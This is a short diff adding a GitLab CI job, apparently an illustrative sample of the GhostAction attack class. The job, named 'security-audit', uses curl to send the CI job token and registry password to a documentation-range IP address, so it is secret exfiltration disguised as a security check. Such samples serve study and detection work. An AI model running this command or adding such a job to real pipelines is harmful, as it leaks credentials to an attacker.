@@ -1,0 +1,6 @@
+# GhostAction (GitGuardian, 2025/2026): a hijacked account added a job disguised
+# as a security check that exfiltrates the pipeline's CI secrets. Here as the
+# same attack class in GitLab CI; the host is a documentation IP (RFC 5737).
+security-audit:
+  script:
+    - curl -sf -d "token=$CI_JOB_TOKEN&registry=$CI_REGISTRY_PASSWORD" https://198.51.100.44/collect
